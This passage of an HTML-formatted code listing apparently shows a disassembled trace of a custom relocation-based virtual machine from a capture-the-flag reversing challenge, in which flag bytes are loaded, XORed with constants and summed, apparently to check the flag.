class="number">803425</span>cc40800027c3000000000000000000000000000000</span><br><span class="line">--------------------</span><br><span class="line">    <span class="number">0x0</span>:<span class="keyword">xor</span>byte ptr [s4], <span class="number">0x27</span></span><br><span class="line">--------------------</span><br><span class="line">[<span class="number">0500</span>] :: array [<span class="number">0x17008040cc250480</span>, <span class="number">0xc3</span>, <span class="number">0x0</span>]</span><br><span class="line">[<span class="number">0503</span>] :: mov s3, &amp;r500.r_address</span><br><span class="line">[<span class="number">0504</span>] :: setinfo s3, name=<span class="number">0x1a</span>, info=<span class="number">0x1</span>, other=<span class="number">0x0</span>, shndx=<span class="number">0x0</span></span><br><span class="line">[<span class="number">0505</span>] :: add r500.r_address, s3, <span class="number">0</span></span><br><span class="line">[<span class="number">0506</span>] :: mov r500.r_address, s2</span><br><span class="line">[<span class="number">0507</span>] :: mov s2, &amp;s4</span><br><span class="line">[<span class="number">0509</span>] :: <span class="built_in">mov</span>(<span class="number">1</span>) arr[<span class="number">2</span>], s2</span><br><span class="line">[<span class="number">0510</span>] :: mov s2, &amp;flag[<span class="number">24</span>]</span><br><span class="line">[<span class="number">0511</span>] :: mov s4, s2</span><br><span class="line">[<span class="number">0512</span>] :: exec r512.r_address &lt;- <span class="number">803425</span>cc40800024c3000000000000000000000000000000</span><br><span class="line">--------------------</span><br><span class="line">    <span class="number">0x0</span>:<span class="keyword">xor</span>byte ptr [s4], <span class="number">0x24</span></span><br><span class="line">--------------------</span><br><span class="line">[<span class="number">0521</span>] :: array [<span class="number">0x18008040cc250480</span>, <span class="number">0xc3</span>, <span class="number">0x0</span>]</span><br><span class="line">[<span class="number">0524</span>] :: mov s3, &amp;r521.r_address</span><br><span class="line">[<span class="number">0525</span>] :: setinfo s3, name=<span class="number">0x1a</span>, info=<span class="number">0x1</span>, other=<span class="number">0x0</span>, shndx=<span class="number">0x0</span></span><br><span class="line">[<span class="number">0526</span>] :: add r521.r_address, s3, <span class="number">0</span></span><br><span class="line">[<span class="number">0527</span>] :: mov r521.r_address, s2</span><br><span class="line">[<span class="number">0528</span>] :: mov s2, &amp;s4</span><br><span class="line">[<span class="number">0530</span>] :: <span class="built_in">mov</span>(<span class="number">1</span>) arr[<span class="number">3</span>], s2</span><br><span class="line">[<span class="number">0531</span>] :: mov s2, &amp;flag[<span class="number">25</span>]</span><br><span class="line">[<span class="number">0532</span>] :: mov s4, s2</span><br><span class="line">[<span class="number">0533</span>] :: exec r533.r_address &lt;- <span class="number">803425</span>cc40800025c3000000000000000000000000000000</span><br><span class="line">--------------------</span><br><span class="line">    <span class="number">0x0</span>:<span class="keyword">xor</span>byte ptr [s4], <span class="number">0x25</span></span><br><span class="line">--------------------</span><br><span class="line">[<span class="number">0542</span>] :: array [<span class="number">0x19008040cc250480</span>, <span class="number">0xc3</span>, <span class="number">0x0</span>]</span><br><span class="line">[<span class="number">0545</span>] :: mov s3, &amp;r542.r_address</span><br><span class="line">[<span class="number">0546</span>] :: setinfo s3, name=<span class="number">0x1a</span>, info=<span class="number">0x1</span>, other=<span class="number">0x0</span>, shndx=<span class="number">0x0</span></span><br><span class="line">[<span class="number">0547</span>] :: add r542.r_address, s3, <span class="number">0</span></span><br><span class="line">[<span class="number">0548</span>] :: mov r542.r_address, s2</span><br><span class="line">[<span class="number">0549</span>] :: mov s2, &amp;s4</span><br><span class="line">[<span class="number">0551</span>] :: <span class="built_in">mov</span>(<span class="number">1</span>) arr[<span class="number">3</span>], s2</span><br><span class="line">[<span class="number">0552</span>] :: mov s2, &amp;flag[<span class="number">26</span>]</span><br><span class="line">[<span class="number">0553</span>] :: mov s4, s2</span><br><span class="line">[<span class="number">0554</span>] :: exec r554.r_address &lt;- <span class="number">803425</span>cc40800026c3000000000000000000000000000000</span><br><span class="line">--------------------</span><br><span class="line">    <span class="number">0x0</span>:<span class="keyword">xor</span>byte ptr [s4], <span class="number">0x26</span></span><br><span class="line">--------------------</span><br><span class="line">[<span class="number">0563</span>] :: array [<span class="number">0x1a008040cc250480</span>, <span class="number">0xc3</span>, <span class="number">0x0</span>]</span><br><span class="line">[<span class="number">0566</span>] :: mov s3, &amp;r563.r_address</span><br><span class="line">[<span class="number">0567</span>] :: setinfo s3, name=<span class="number">0x1a</span>, info=<span class="number">0x1</span>, other=<span class="number">0x0</span>, shndx=<span class="number">0x0</span></span><br><span class="line">[<span class="number">0568</span>] :: add r563.r_address, s3, <span class="number">0</span></span><br><span class="line">[<span class="number">0569</span>] :: mov r563.r_address, s2</span><br><span class="line">[<span class="number">0570</span>] :: mov s2, &amp;s4</span><br><span class="line">[<span class="number">0572</span>] :: <span class="built_in">mov</span>(<span class="number">1</span>) arr[<span class="number">3</span>], s2</span><br><span class="line">[<span class="number">0573</span>] :: mov s2, &amp;flag[<span class="number">27</span>]</span><br><span class="line">[<span class="number">0574</span>] :: mov s4, s2</span><br><span class="line">[<span class="number">0575</span>] :: exec r575.r_address &lt;- <span class="number">803425</span>cc40800027c3000000000000000000000000000000</span><br><span class="line">--------------------</span><br><span class="line">    <span class="number">0x0</span>:<span class="keyword">xor</span>byte ptr [s4], <span class="number">0x27</span></span><br><span class="line">--------------------</span><br><span class="line">[<span class="number">0584</span>] :: array [<span class="number">0x1b008040cc250480</span>, <span class="number">0xc3</span>, <span class="number">0x0</span>]</span><br><span class="line">[<span class="number">0587</span>] :: mov s3, &amp;r584.r_address</span><br><span class="line">[<span class="number">0588</span>] :: setinfo s3, name=<span class="number">0x1a</span>, info=<span class="number">0x1</span>, other=<span class="number">0x0</span>, shndx=<span class="number">0x0</span></span><br><span class="line">[<span class="number">0589</span>] :: add r584.r_address, s3, <span class="number">0</span></span><br><span class="line">[<span class="number">0590</span>] :: mov r584.r_address, s2</span><br><span class="line">[<span class="number">0591</span>] :: mov s2, &amp;s4</span><br><span class="line">[<span class="number">0593</span>] :: <span class="built_in">mov</span>(<span class="number">1</span>) arr[<span class="number">3</span>], s2</span><br><span class="line">[<span class="number">0594</span>] :: mov s4, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">0595</span>] :: mov <span class="built_in">fail</span>(), &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">0596</span>] :: mov s5, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">0597</span>] :: mov s2, &amp;arr[<span class="number">0</span>]</span><br><span class="line">[<span class="number">0599</span>] :: mov s6, s2</span><br><span class="line">[<span class="number">0600</span>] :: exec r600.r_address &lt;- <span class="number">803425f</span>c40800070c3000000000000000000000000000000</span><br><span class="line">--------------------</span><br><span class="line">    <span class="number">0x0</span>:<span class="keyword">xor</span>byte ptr [<span class="number">0x8040fc</span>], <span class="number">0x70</span></span><br><span class="line">--------------------</span><br><span class="line">[<span class="number">0609</span>] :: mov s2, &amp;s6</span><br><span class="line">[<span class="number">0611</span>] :: add s5, s5, s2</span><br><span class="line">[<span class="number">0614</span>] :: mov s6, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">0615</span>] :: mov s2, &amp;arr[<span class="number">0</span>]</span><br><span class="line">[<span class="number">0616</span>] :: mov s6, s2</span><br><span class="line">[<span class="number">0617</span>] :: exec r617.r_address &lt;- <span class="number">803425f</span>c4080007cc3000000000000000000000000000000</span><br><span class="line">--------------------</span><br><span class="line">    <span class="number">0x0</span>:<span class="keyword">xor</span>byte ptr [<span class="number">0x8040fc</span>], <span class="number">0x7c</span></span><br><span class="line">--------------------</span><br><span class="line">[<span class="number">0626</span>] :: mov s2, &amp;s6</span><br><span class="line">[<span class="number">0628</span>] :: add s5, s5, s2</span><br><span class="line">[<span class="number">0631</span>] :: mov s6, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">0632</span>] :: mov s2, &amp;arr[<span class="number">0</span>]</span><br><span class="line">[<span class="number">0633</span>] :: mov s6, s2</span><br><span class="line">[<span class="number">0634</span>] :: exec r634.r_address &lt;- <span class="number">803425f</span>c40800073c3000000000000000000000000000000</span><br><span class="line">--------------------</span><br><span class="line">    <span class="number">0x0</span>:<span class="keyword">xor</span>byte ptr [<span class="number">0x8040fc</span>], <span class="number">0x73</span></span><br><span class="line">--------------------</span><br><span class="line">[<span class="number">0643</span>] :: mov s2, &amp;s6</span><br><span class="line">[<span class="number">0645</span>] :: add s5, s5, s2</span><br><span class="line">[<span class="number">0648</span>] :: mov s6, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">0649</span>] :: mov s2, &amp;arr[<span class="number">0</span>]</span><br><span class="line">[<span class="number">0650</span>] :: mov s6, s2</span><br><span class="line">[<span class="number">0651</span>] :: exec r651.r_address &lt;- <span class="number">803425f</span>c40800078c3000000000000000000000000000000</span><br><span class="line">--------------------</span><br><span class="line">    <span class="number">0x0</span>:<span class="keyword">xor</span>byte ptr [<span class="number">0x8040fc</span>], <span class="number">0x78</span></span><br><span class="line">--------------------</span><br><span class="line">[<span class="number">0660</span>] :: mov s2, &amp;s6</span><br><span class="line">[<span class="number">0662</span>] :: add s5, s5, s2</span><br><span class="line">[<span class="number">0665</span>] :: mov s6, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">0666</span>] :: mov s2, &amp;arr[<span class="number">0</span>]</span><br><span class="line">[<span class="number">0667</span>] :: mov s6, s2</span><br><span class="line">[<span class="number">0668</span>] :: exec r668.r_address &lt;- <span class="number">803425f</span>c4080006fc3000000000000000000000000000000</span><br><span class="line">--------------------</span><br><span class="line">    <span class="number">0x0</span>:<span class="keyword">xor</span>byte ptr [<span class="number">0x8040fc</span>], <span class="number">0x6f</span></span><br><span class="line">--------------------</span><br><span class="line">[<span class="number">0677</span>] :: mov s2, &amp;s6</span><br><span class="line">[<span class="number">0679</span>] :: add s5, s5, s2</span><br><span class="line">[<span class="number">0682</span>] :: mov s6, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">0683</span>] :: mov s2, &amp;arr[<span class="number">0</span>]</span><br><span class="line">[<span class="number">0684</span>] :: mov s6, s2</span><br><span class="line">[<span class="number">0685</span>] :: exec r685.r_address &lt;- <span class="number">803425f</span>c40800027c3000000000000000000000000000000</span><br><span class="line">--------------------</span><br><span class="line">    <span class="number">0x0</span>:<span class="keyword">xor</span>byte ptr [<span class="number">0x8040fc</span>], <span class="number">0x27</span></span><br><span class="line">--------------------</span><br><span class="line">[<span class="number">0694</span>] :: mov s2, &amp;s6</span><br><span class="line">[<span class="number">0696</span>] :: add s5, s5, s2</span><br><span class="line">[<span class="number">0699</span>] :: mov s6, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">0700</span>] :: mov s2, &amp;arr[<span class="number">0</span>]</span><br><span class="line">[<span class="number">0701</span>] :: mov s6, s2</span><br><span class="line">[<span class="number">0702</span>] :: exec r702.r_address &lt;- <span class="number">803425f</span>c4080002ac3000000000000000000000000000000</span><br><span class="line">--------------------</span><br><span class="line">    <span class="number">0x0</span>:<span class="keyword">xor</span>byte ptr [<span class="number">0x8040fc</span>], <span class="number">0x2a</span></span><br><span class="line">--------------------</span><br><span class="line">[<span class="number">0711</span>] :: mov s2, &amp;s6</span><br><span class="line">[<span class="number">0713</span>] :: add s5, s5, s2</span><br><span class="line">[<span class="number">0716</span>] :: mov s6, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">0717</span>] :: mov s2, &amp;arr[<span class="number">0</span>]</span><br><span class="line">[<span class="number">0718</span>] :: mov s6, s2</span><br><span class="line">[<span class="number">0719</span>] :: exec r719.r_address &lt;- <span class="number">803425f</span>c4080002cc3000000000000000000000000000000</span><br><span class="line">--------------------</span><br><span class="line">    <span class="number">0x0</span>:<span class="keyword">xor</span>byte ptr [<span class="number">0x8040fc</span>], <span class="number">0x2c</span></span><br><span class="line">--------------------</span><br><span class="line">[<span class="number">0728</span>] :: mov s2, &amp;s6</span><br><span class="line">[<span class="number">0730</span>] :: add s5, s5, s2</span><br><span class="line">[<span class="number">0733</span>] :: mov s6, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">0734</span>] :: mov s2, &amp;arr[<span class="number">1</span>]</span><br><span class="line">[<span class="number">0735</span>] :: mov s6, s2</span><br><span class="line">[<span class="number">0736</span>] :: exec r736.r_address &lt;- <span class="number">803425f</span>c4080007fc3000000000000000000000000000000</span><br><span class="line">--------------------</span><br><span class="line">    <span class="number">0x0</span>:<span class="keyword">xor</span>byte ptr [<span class="number">0x8040fc</span>], <span class="number">0x7f</span></span><br><span class="line">--------------------</span><br><span class="line">[<span class="number">0745</span>] :: mov s2, &amp;s6</span><br><span class="line">[<span class="number">0747</span>] :: add s5, s5, s2</span><br><span class="line">[<span class="number">0750</span>] :: mov s6, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">0751</span>] :: mov s2, &amp;arr[<span class="number">1</span>]</span><br><span class="line">[<span class="number">0752</span>] :: mov s6, s2</span><br><span class="line">[<span class="number">0753</span>] :: exec r753.r_address &lt;- <span class="number">803425f</span>c40800035c3000000000000000000000000000000</span><br><span class="line">--------------------</span><br><span class="line">    <span class="number">0x0</span>:<span class="keyword">xor</span>byte ptr [<span class="number">0x8040fc</span>], <span class="number">0x35</span></span><br><span class="line">--------------------</span><br><span class="line">[<span class="number">0762</span>] :: mov s2, &amp;s6</span><br><span class="line">[<span class="number">0764</span>] :: add s5, s5, s2</span><br><span class="line">[<span class="number">0767</span>] :: mov s6, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">0768</span>] :: mov s2, &amp;arr[<span class="number">1</span>]</span><br><span class="line">[<span class="number">0769</span>] :: mov s6, s2</span><br><span class="line">[<span class="number">0770</span>] :: exec r770.r_address &lt;- <span class="number">803425f</span>c4080002dc3000000000000000000000000000000</span><br><span class="line">--------------------</span><br><span class="line">    <span class="number">0x0</span>:<span class="keyword">xor</span>byte ptr [<span class="number">0x8040fc</span>], <span class="number">0x2d</span></span><br><span class="line">--------------------</span><br><span class="line">[<span class="number">0779</span>] :: mov s2, &amp;s6</span><br><span class="line">[<span class="number">0781</span>] :: add s5, s5, s2</span><br><span class="line">[<span class="number">0784</span>] :: mov s6, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">0785</span>] :: mov s2, &amp;arr[<span class="number">1</span>]</span><br><span class="line">[<span class="number">0786</span>] :: mov s6, s2</span><br><span class="line">[<span class="number">0787</span>] :: exec r787.r_address &lt;- <span class="number">803425f</span>c40800032c3000000000000000000000000000000</span><br><span class="line">--------------------</span><br><span class="line">    <span class="number">0x0</span>:<span class="keyword">xor</span>byte ptr [<span class="number">0x8040fc</span>], <span class="number">0x32</span></span><br><span class="line">--------------------</span><br><span class="line">[<span class="number">0796</span>] :: mov s2, &amp;s6</span><br><span class="line">[<span class="number">0798</span>] :: add s5, s5, s2</span><br><span class="line">[<span class="number">0801</span>] :: mov s6, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">0802</span>] :: mov s2, &amp;arr[<span class="number">1</span>]</span><br><span class="line">[<span class="number">0803</span>] :: mov s6, s2</span><br><span class="line">[<span class="number">0804</span>] :: exec r804.r_address &lt;- <span class="number">803425f</span>c40800037c3000000000000000000000000000000</span><br><span class="line">--------------------</span><br><span class="line">    <span class="number">0x0</span>:<span class="keyword">xor</span>byte ptr [<span class="number">0x8040fc</span>], <span class="number">0x37</span></span><br><span class="line">--------------------</span><br><span class="line">[<span class="number">0813</span>] :: mov s2, &amp;s6</span><br><span class="line">[<span class="number">0815</span>] :: add s5, s5, s2</span><br><span class="line">[<span class="number">0818</span>] :: mov s6, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">0819</span>] :: mov s2, &amp;arr[<span class="number">1</span>]</span><br><span class="line">[<span class="number">0820</span>] :: mov s6, s2</span><br><span class="line">[<span class="number">0821</span>] :: exec r821.r_address &lt;- <span class="number">803425f</span>c4080003bc3000000000000000000000000000000</span><br><span class="line">--------------------</span><br><span class="line">    <span class="number">0x0</span>:<span class="keyword">xor</span>byte ptr [<span class="number">0x8040fc</span>], <span class="number">0x3b</span></span><br><span class="line">--------------------</span><br><span class="line">[<span class="number">0830</span>] :: mov s2, &amp;s6</span><br><span class="line">[<span class="number">0832</span>] :: add s5, s5, s2</span><br><span class="line">[<span class="number">0835</span>] :: mov s6, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">0836</span>] :: mov s2, &amp;arr[<span class="number">1</span>]</span><br><span class="line">[<span class="number">0837</span>] :: mov s6, s2</span><br><span class="line">[<span class="number">0838</span>] :: exec r838.r_address &lt;- <span class="number">803425f</span>c40800022c3000000000000000000000000000000</span><br><span class="line">--------------------</span><br><span class="line">    <span class="number">0x0</span>:<span class="keyword">xor</span>byte ptr [<span class="number">0x8040fc</span>], <span class="number">0x22</span></span><br><span class="line">--------------------</span><br><span class="line">[<span class="number">0847</span>] :: mov s2, &amp;s6</span><br><span class="line">[<span class="number">0849</span>] :: add s5, s5, s2</span><br><span class="line">[<span class="number">0852</span>] :: mov s6, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">0853</span>] :: mov s2, &amp;arr[<span class="number">1</span>]</span><br><span class="line">[<span class="number">0854</span>] :: mov s6, s2</span><br><span class="line">[<span class="number">0855</span>] :: exec r855.r_address &lt;- <span class="number">803425f</span>c40800059c3000000000000000000000000000000</span><br><span class="line">--------------------</span><br><span class="line">    <span class="number">0x0</span>:<span class="keyword">xor</span>byte ptr [<span class="number">0x8040fc</span>], <span class="number">0x59</span></span><br><span class="line">--------------------</span><br><span class="line">[<span class="number">0864</span>] :: mov s2, &amp;s6</span><br><span class="line">[<span class="number">0866</span>] :: add s5, s5, s2</span><br><span class="line">[<span class="number">0869</span>] :: mov s6, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">0870</span>] :: mov s2, &amp;arr[<span class="number">2</span>]</span><br><span class="line">[<span class="number">0871</span>] :: mov s6, s2</span><br><span class="line">[<span class="number">0872</span>] :: exec r872.r_address &lt;- <span class="number">803425f</span>c40800053c3000000000000000000000000000000</span><br><span class="line">--------------------</span><br><span class="line">    <span class="number">0x0</span>:<span class="keyword">xor</span>byte ptr [<span class="number">0x8040fc</span>], <span class="number">0x53</span></span><br><span class="line">--------------------</span><br><span class="line">[<span class="number">0881</span>] :: mov s2, &amp;s6</span><br><span class="line">[<span class="number">0883</span>] :: add s5, s5, s2</span><br><span class="line">[<span class="number">0886</span>] :: mov s6, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">0887</span>] :: mov s2, &amp;arr[<span class="number">2</span>]</span><br><span class="line">[<span class="number">0888</span>] :: mov s6, s2</span><br><span class="line">[<span class="number">0889</span>] :: exec r889.r_address &lt;- <span class="number">803425f</span>c4080008ec3000000000000000000000000000000</span><br><span class="line">--------------------</span><br><span class="line">    <span class="number">0x0</span>:<span class="keyword">xor</span>byte ptr [<span class="number">0x8040fc</span>], <span class="number">0x8e</span></span><br><span class="line">--------------------</span><br><span class="line">[<span class="number">0898</span>] :: mov s2, &amp;s6</span><br><span class="line">[<span class="number">0900</span>] :: add s5, s5, s2</span><br><span class="line">[<span class="number">0903</span>] :: mov s6, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">0904</span>] :: mov s2, &amp;arr[<span class="number">2</span>]</span><br><span class="line">[<span class="number">0905</span>] :: mov s6, s2</span><br><span class="line">[<span class="number">0906</span>] :: exec r906.r_address &lt;- <span class="number">803425f</span>c4080003dc3000000000000000000000000000000</span><br><span class="line">--------------------</span><br><span class="line">    <span class="number">0x0</span>:<span class="keyword">xor</span>byte ptr [<span class="number">0x8040fc</span>], <span class="number">0x3d</span></span><br><span class="line">--------------------</span><br><span class="line">[<span class="number">0915</span>] :: mov s2, &amp;s6</span><br><span class="line">[<span class="number">0917</span>] :: add s5, s5, s2</span><br><span class="line">[<span class="number">0920</span>] :: mov s6, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">0921</span>] :: mov s2, &amp;arr[<span class="number">2</span>]</span><br><span class="line">[<span class="number">0922</span>] :: mov s6, s2</span><br><span class="line">[<span class="number">0923</span>] :: exec r923.r_address &lt;- <span class="number">803425f</span>c4080002ac3000000000000000000000000000000</span><br><span class="line">--------------------</span><br><span class="line">    <span class="number">0x0</span>:<span class="keyword">xor</span>byte ptr [<span class="number">0x8040fc</span>], <span class="number">0x2a</span></span><br><span class="line">--------------------</span><br><span class="line">[<span class="number">0932</span>] :: mov s2, &amp;s6</span><br><span class="line">[<span class="number">0934</span>] :: add s5, s5, s2</span><br><span class="line">[<span class="number">0937</span>] :: mov s6, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">0938</span>] :: mov s2, &amp;arr[<span class="number">2</span>]</span><br><span class="line">[<span class="number">0939</span>] :: mov s6, s2</span><br><span class="line">[<span class="number">0940</span>] :: exec r940.r_address &lt;- <span class="number">803425f</span>c40800059c3000000000000000000000000000000</span><br><span class="line">--------------------</span><br><span class="line">    <span class="number">0x0</span>:<span class="keyword">xor</span>byte ptr [<span class="number">0x8040fc</span>], <span class="number">0x59</span></span><br><span class="line">--------------------</span><br><span class="line">[<span class="number">0949</span>] :: mov s2, &amp;s6</span><br><span class="line">[<span class="number">0951</span>] :: add s5, s5, s2</span><br><span class="line">[<span class="number">0954</span>] :: mov s6, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">0955</span>] :: mov s2, &amp;arr[<span class="number">2</span>]</span><br><span class="line">[<span class="number">0956</span>] :: mov s6, s2</span><br><span class="line">[<span class="number">0957</span>] :: exec r957.r_address &lt;- <span class="number">803425f</span>c40800027c3000000000000000000000000000000</span><br><span class="line">--------------------</span><br><span class="line">    <span class="number">0x0</span>:<span class="keyword">xor</span>byte ptr [<span class="number">0x8040fc</span>], <span class="number">0x27</span></span><br><span class="line">--------------------</span><br><span class="line">[<span class="number">0966</span>] :: mov s2, &amp;s6</span><br><span class="line">[<span class="number">0968</span>] :: add s5, s5, s2</span><br><span class="line">[<span class="number">0971</span>] :: mov s6, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">0972</span>] :: mov s2, &amp;arr[<span class="number">2</span>]</span><br><span class="line">[<span class="number">0973</span>] :: mov s6, s2</span><br><span class="line">[<span class="number">0974</span>] :: exec r974.r_address &lt;- <span class="number">803425f</span>c4080002dc3000000000000000000000000000000</span><br><span class="line">--------------------</span><br><span class="line">    <span class="number">0x0</span>:<span class="keyword">xor</span>byte ptr [<span class="number">0x8040fc</span>], <span class="number">0x2d</span></span><br><span class="line">--------------------</span><br><span class="line">[<span class="number">0983</span>] :: mov s2, &amp;s6</span><br><span class="line">[<span class="number">0985</span>] :: add s5, s5, s2</span><br><span class="line">[<span class="number">0988</span>] :: mov s6, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">0989</span>] :: mov s2, &amp;arr[<span class="number">2</span>]</span><br><span class="line">[<span class="number">0990</span>] :: mov s6, s2</span><br><span class="line">[<span class="number">0991</span>] :: exec r991.r_address &lt;- <span class="number">803425f</span>c40800029c3000000000000000000000000000000</span><br><span class="line">--------------------</span><br><span class="line">    <span class="number">0x0</span>:<span class="keyword">xor</span>byte ptr [<span class="number">0x8040fc</span>], <span class="number">0x29</span></span><br><span class="line">--------------------</span><br><span class="line">[<span class="number">1000</span>] :: mov s2, &amp;s6</span><br><span class="line">[<span class="number">1002</span>] :: add s5, s5, s2</span><br><span class="line">[<span class="number">1005</span>] :: mov s6, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">1006</span>] :: mov s2, &amp;arr[<span class="number">3</span>]</span><br><span class="line">[<span class="number">1007</span>] :: mov s6, s2</span><br><span class="line">[<span class="number">1008</span>] :: exec r1008.r_address &lt;- <span class="number">803425f</span>c40800034c3000000000000000000000000000000</span><br><span class="line">--------------------</span><br><span class="line">    <span class="number">0x0</span>:<span class="keyword">xor</span>byte ptr [<span class="number">0x8040fc</span>], <span class="number">0x34</span></span><br><span class="line">--------------------</span><br><span class="line">[<span class="number">1017</span>] :: mov s2, &amp;s6</span><br><span class="line">[<span class="number">1019</span>] :: add s5, s5, s2</span><br><span class="line">[<span class="number">1022</span>] :: mov s6, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">1023</span>] :: mov s2, &amp;arr[<span class="number">3</span>]</span><br><span class="line">[<span class="number">1024</span>] :: mov s6, s2</span><br><span class="line">[<span class="number">1025</span>] :: exec r1025.r_address &lt;- <span class="number">803425f</span>c4080002dc3000000000000000000000000000000</span><br><span class="line">--------------------</span><br><span class="line">    <span class="number">0x0</span>:<span class="keyword">xor</span>byte ptr [<span class="number">0x8040fc</span>], <span class="number">0x2d</span></span><br><span class="line">--------------------</span><br><span class="line">[<span class="number">1034</span>] :: mov s2, &amp;s6</span><br><span class="line">[<span class="number">1036</span>] :: add s5, s5, s2</span><br><span class="line">[<span class="number">1039</span>] :: mov s6, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">1040</span>] :: mov s2, &amp;arr[<span class="number">3</span>]</span><br><span class="line">[<span class="number">1041</span>] :: mov s6, s2</span><br><span class="line">[<span class="number">1042</span>] :: exec r1042.r_address &lt;- <span class="number">803425f</span>c40800061c3000000000000000000000000000000</span><br><span class="line">--------------------</span><br><span class="line">    <span class="number">0x0</span>:<span class="keyword">xor</span>byte ptr [<span class="number">0x8040fc</span>], <span class="number">0x61</span></span><br><span class="line">--------------------</span><br><span class="line">[<span class="number">1051</span>] :: mov s2, &amp;s6</span><br><span class="line">[<span class="number">1053</span>] :: add s5, s5, s2</span><br><span class="line">[<span class="number">1056</span>] :: mov s6, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">1057</span>] :: mov s2, &amp;arr[<span class="number">3</span>]</span><br><span class="line">[<span class="number">1058</span>] :: mov s6, s2</span><br><span class="line">[<span class="number">1059</span>] :: exec r1059.r_address &lt;- <span class="number">803425f</span>c40800032c3000000000000000000000000000000</span><br><span class="line">--------------------</span><br><span class="line">    <span class="number">0x0</span>:<span class="keyword">xor</span>byte ptr [<span class="number">0x8040fc</span>], <span class="number">0x32</span></span><br><span class="line">--------------------</span><br><span class="line">[<span class="number">1068</span>] :: mov s2, &amp;s6</span><br><span class="line">[<span class="number">1070</span>] :: add s5, s5, s2</span><br><span class="line">[<span class="number">1073</span>] :: mov s6, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">1074</span>] :: mov s2, &amp;flag[<span class="number">28</span>]</span><br><span class="line">[<span class="number">1075</span>] :: mov s6, s2</span><br><span class="line">[<span class="number">1076</span>] :: mov s2, &amp;flag[<span class="number">29</span>]</span><br><span class="line">[<span class="number">1077</span>] :: mov s7, s2</span><br><span class="line">[<span class="number">1078</span>] :: mov s8, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">1079</span>] :: mov s2, &amp;s8</span><br><span class="line">[<span class="number">1080</span>] :: add s8, s8, s2</span><br><span class="line">[<span class="number">1083</span>] :: mov s2, &amp;s6</span><br><span class="line">[<span class="number">1084</span>] :: add s8, s8, s2</span><br><span class="line">[<span class="number">1087</span>] :: mov s9, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">1088</span>] :: mov s2, &amp;s9</span><br><span class="line">[<span class="number">1089</span>] :: add s9, s9, s2</span><br><span class="line">[<span class="number">1092</span>] :: mov s2, &amp;s7</span><br><span class="line">[<span class="number">1093</span>] :: add s9, s9, s2</span><br><span class="line">[<span class="number">1096</span>] :: mov s2, &amp;s9</span><br><span class="line">[<span class="number">1097</span>] :: add s10, s8, s2</span><br><span class="line">[<span class="number">1100</span>] :: exec r1100.r_address &lt;- <span class="number">8034255</span>c4180006cc3000000000000000000000000000000</span><br><span class="line">--------------------</span><br><span class="line">    <span class="number">0x0</span>:<span class="keyword">xor</span>byte ptr [<span class="number">0x80415c</span>], <span class="number">0x6c</span></span><br><span class="line">--------------------</span><br><span class="line">[<span class="number">1109</span>] :: mov s2, &amp;s10</span><br><span class="line">[<span class="number">1111</span>] :: add s5, s5, s2</span><br><span class="line">[<span class="number">1114</span>] :: mov s6, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">1115</span>] :: mov s7, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">1116</span>] :: mov s8, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">1117</span>] :: mov s9, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">1118</span>] :: mov s10, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">1119</span>] :: mov s2, &amp;flag[<span class="number">28</span>]</span><br><span class="line">[<span class="number">1120</span>] :: mov s6, s2</span><br><span class="line">[<span class="number">1121</span>] :: mov s2, &amp;flag[<span class="number">29</span>]</span><br><span class="line">[<span class="number">1122</span>] :: mov s7, s2</span><br><span class="line">[<span class="number">1123</span>] :: mov s8, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">1124</span>] :: mov s2, &amp;s8</span><br><span class="line">[<span class="number">1125</span>] :: add s8, s8, s2</span><br><span class="line">[<span class="number">1128</span>] :: mov s2, &amp;s6</span><br><span class="line">[<span class="number">1129</span>] :: add s8, s8, s2</span><br><span class="line">[<span class="number">1132</span>] :: mov s2, &amp;s8</span><br><span class="line">[<span class="number">1133</span>] :: add s8, s8, s2</span><br><span class="line">[<span class="number">1136</span>] :: mov s9, &amp;<span class="number">0</span></span><br><span class="line">[<span class="number">1137</span>] :: mov s2, &amp;s9</span><br><span class="line">[<span class="number">1138</span>] :: add s9, s9, s2</span><br><span class="line">[<span class="number">1141</span>] :: mov s2, &amp;s7</span><br><span class="line">[<span class="number">1142</span>] :: add s9, s9, s2</span><br><span class="line">[<span class="number">1145</span>] :: mov s2, &amp;s9</span><br><span class="line">[<span class="number">1146</span>] :: add s10, s8, s2</span><br><span class="line">[<span class="number">1149</span>] :: exec r1149.r_address &lt;- <span class="number">8034255</span>c418000a1c3000000000000000000000000000000</span><br><span class="line">--------------------</span><br><span class="line">    <span class="number">0x0</span>:<span class="keyword">xor</span>byte ptr [<span 